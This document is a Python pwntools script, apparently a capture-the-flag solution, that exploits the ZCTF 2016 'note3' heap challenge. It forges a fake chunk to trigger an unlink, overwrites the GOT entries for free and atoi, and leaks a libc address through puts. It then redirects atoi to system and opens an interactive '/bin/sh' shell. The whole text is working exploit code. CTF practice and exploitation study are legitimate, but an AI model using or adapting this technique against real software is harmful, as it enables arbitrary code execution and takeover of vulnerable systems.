from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_16_zctf_2016_note3')
elf = ELF('./data/bin/heap23_16_zctf_2016_note3')
libc = elf.libc
ptr = 0x6020C8
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']

def new(size, content):
    p.recvuntil(b'>>\n')
    p.sendline(b'1')
    p.recvuntil(b'1024)\n')
    p.sendline(size)
    p.recvuntil(b'content:\n')
    p.sendline(content)

def show():
    p.recvuntil(b'>>\n')
    p.sendline(b'2')

def edit(idx, content):
    p.recvuntil(b'>>\n')
    p.sendline(b'3')
    p.recvuntil(b'note:\n')
    p.sendline(idx)
    p.recvuntil(b'content:\n')
    p.sendline(content)

def delete(idx):
    p.recvuntil(b'>>\n')
    p.sendline(b'4')
    p.recvuntil(b'note:\n')
    p.sendline(idx)

new(b'0', b'aaaa');new(b'256', b'aaaa');new(b'256', b'aaaa');new(b'256', b'aaaa')#step.1
fd = ptr + 0x10 - 0x18;bk = ptr + 0x10 - 0x10;payload = p64(0) * 3 + p64(0x121) + b'a' * 0x110 + p64(0) + p64(0x101) + p64(fd) + p64(bk) + b'a' * (0x100-0x20) + p64(0x100) + p64(0x110);edit(b'0', payload)#step.2
delete(b'1')#step.3
payload = b'a' * 0x8 + p64(free_got) + p64(atoi_got) + p64(atoi_got) + p64(atoi_got);edit(b'2', payload)#step.4
edit(b'0', p64(puts_plt)[:-1])#step.5
delete(b'2');atoi_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))#step.6
libc_addr = atoi_addr - libc.symbols['atoi'];system_addr = libc.symbols['system'] + libc_addr;edit(b'3', p64(system_addr)[:-1])#step.7
p.recvuntil(b'>>\n')#step.8
p.sendline(b'/bin/sh')#step.9
p.interactive()